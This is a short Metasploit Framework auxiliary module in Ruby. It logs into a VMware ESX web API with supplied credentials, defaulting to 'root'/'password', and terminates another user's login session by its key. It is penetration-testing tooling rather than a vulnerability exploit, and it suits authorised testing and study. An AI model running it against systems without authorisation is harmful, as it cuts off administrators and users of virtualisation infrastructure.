##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/exploit/vim_soap'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::VIMSoap

	def initialize
		super(
			'Name'           => 'VMWare Terminate ESX Login Sessions',
			'Description'    => %Q{
							This module will log into the Web API of VMWare and try to terminate
							a user's login session as specified by the session key.},
			'Author'         => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(443),
				OptString.new('USERNAME', [ true, "The username to Authenticate with.", 'root' ]),
				OptString.new('PASSWORD', [ true, "The password to Authenticate with.", 'password' ]),
				OptString.new('KEY', [true, "The session key to terminate"])
			], self.class)
	end

	def run

		if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success
			result = vim_terminate_session(datastore['KEY'])
			case result
			when :notfound
				print_error "The specified Session was not found. Check your key"
			when :success
				print_good "The supplied session was terminated successfully."
			when :error
				print_error "There was an error encountered."
			end
		else
			print_error "Login Failure on #{ip}"
			return
		end
	end




end

